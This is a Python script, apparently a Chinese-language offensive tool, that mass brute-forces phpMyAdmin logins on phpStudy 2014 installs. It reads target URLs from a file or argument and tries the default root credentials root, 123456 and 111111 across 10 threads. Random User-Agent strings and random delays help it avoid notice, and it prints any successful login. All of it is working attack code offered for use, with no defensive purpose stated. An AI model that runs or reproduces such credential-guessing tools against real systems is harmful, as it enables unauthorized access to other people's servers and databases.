import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
from urllib import parse
from time import time, sleep
import random
from concurrent.futures import ThreadPoolExecutor
import itertools

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# 随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = f'Chrome/{first_num}.0.{third_num}.{fourth_num}'
    ua = ' '.join([
        'Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
        '(KHTML, like Gecko)', chrome_version, 'Safari/537.36'
    ])
    return ua


# payload
def fuzz(url):
    url_parsed = parse.urlparse(url)
    target_url = f'{url_parsed.scheme}://{url_parsed.netloc}/phpmyadmin/index.php'
    usernames = ['root']
    passwords = ['root', '123456', '111111']

    # 尝试登录每个用户名和密码组合
    for username, password in itertools.product(usernames, passwords):
        data = {
            "pma_username": username,
            "pma_password": password,
            "server": "1",
        }
        try:
            headers = {'User-Agent': get_ua()}
            response = requests.post(target_url, headers=headers, data=data, verify=False, allow_redirects=True,
                                     timeout=10)
            if response.status_code == 200 and 'phpMyAdmin phpStudy 2014' in response.text:
                print(f'\033[32m[+]{target_url} Login Success! username:{username}&password:{password}\033[0m')
                return  # 登录成功后退出
            else:
                print(f'\033[31m[-]{target_url} Login Failed\033[0m')
            sleep(random.uniform(0.5, 2))  # 随机延时，防止请求频率过高
        except requests.Timeout:
            print(f'[!]{target_url} is timeout')
            break
        except Exception as e:
            print(f'[!]Error connecting to {target_url}: {e}')
            break


# 多线程处理
def multithreading(url_list, pool_size=5):
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        executor.map(fuzz, url_list)


if __name__ == '__main__':
    arg = ArgumentParser(description='phpstudy2014批量爆破 By yui14256')
    arg.add_argument("-u", "--url", help="Target URL; Example:http://ip:port")
    arg.add_argument("-f", "--file", help="Target URL list; Example:url.txt")
    args = arg.parse_args()

    start = time()
    if args.url:
        fuzz(args.url)
    elif args.file:
        url_list = []
        with open(args.file, 'r') as file:
            url_list = [line.strip() for line in file]
        multithreading(url_list, 10)

    end = time()
    print(f'任务完成，用时{int(end - start)}秒')
